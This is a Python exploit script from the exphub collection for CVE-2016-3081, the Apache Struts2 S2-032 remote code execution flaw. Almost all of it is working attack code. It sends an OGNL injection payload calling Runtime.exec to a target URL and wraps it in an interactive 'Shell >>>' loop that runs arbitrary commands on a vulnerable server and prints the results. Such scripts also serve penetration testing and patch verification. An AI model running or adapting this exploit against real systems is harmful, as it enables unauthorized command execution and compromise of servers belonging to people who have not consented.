#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author(cn):之乎者也
# author(en):zhzyker
# from:https://github.com/zhzyker/exphub
# telegram:t.me/zhzyker
# qq(群):219291257

import requests
import sys

if len(sys.argv)!=2:
    print('+-------------------------------------------------------------+')
    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub        +')
    print('+      CVE-2016-3081 Struts method 任意代码执行漏洞利用脚本   +')
    print('+-------------------------------------------------------------+')
    print('+ USE: python3 <filename> <url>                               +')
    print('+ EXP: python3 struts2-032_cmd.py http://freeerror.org:8080   +')
    print('+ VER: Struts 2.x < 2.3.20.2                                  +')
    print('+      Struts 2.3.28.x < 2.3.28.1                             +')
    print('+      Struts 2.3.24.x < 2.3.24.2                             +')
    print('+-------------------------------------------------------------+')
    sys.exit()
url = sys.argv[1]
cmd = "whoami"
TMOUT = 10

headers = {
    "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"application/x-www-form-urlencoded"
    }
def do_exp(cmd):
    payload = "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd="+cmd+"&pp=____A&ppp=%20&encoding=UTF-8"
    target = url+payload
    try:
        r = requests.get(target, headers=headers, timeout=TMOUT)
        print (r.text)
    except:
        print ("[-] Target "+url+" Not Struts2-032 Vuln!!! Good Luck\n")
        exit()

while 1:
    cmd = input("Shell >>> ")
    if cmd == "exit" : exit(0)
    do_exp(cmd)

